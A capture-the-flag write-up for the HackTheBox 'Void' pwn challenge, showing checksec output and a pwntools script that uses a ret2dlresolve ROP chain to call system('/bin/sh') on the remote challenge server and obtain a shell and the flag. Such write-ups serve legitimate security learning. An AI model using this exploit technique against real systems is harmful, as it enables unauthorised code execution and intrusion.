# Void WriteUp by Om Honrao (@Inv1s1bl3#7047)

## Challenge Description
```
The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.
```

## Challenge Files
```
- pwn_void.zip
    ./challenge
        ./glibc
        ./glibc/ld-linux-x86-64.so.2
        ./glibc/libc.so.6
        ./flag.txt
        ./void
```

## Challenge Solution
We start from basic analysis of binary with `checksec` and `file` command.
```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'./glibc/'
```
This is obviously a `Ret2Dlresolve` challenge.
Wasn't quite sure what to do but somehow got it.

We basically use ROP to call system and then get the shell i wasn't able to do this without the pwntools so i basically need to learn more but yeah pwntools is kind of easy so i used it.

```python
from pwn import *

elf = context.binary = ELF('void', checksec=False)

#create rop chain
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

p = remote('161.35.168.118',31576)

#send payload
p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))

#get shell
p.interactive()
```

What this does basically is create a ROP chain and make Ret2dlresolvePayload object and then we read the data_addr of the Ret2dlresolvePayload object and then we call ret2dlresolve and then we send the payload which pops up the shell!

## Flag
```
HTB{r3s0lv3_th3_d4rkn355}
```
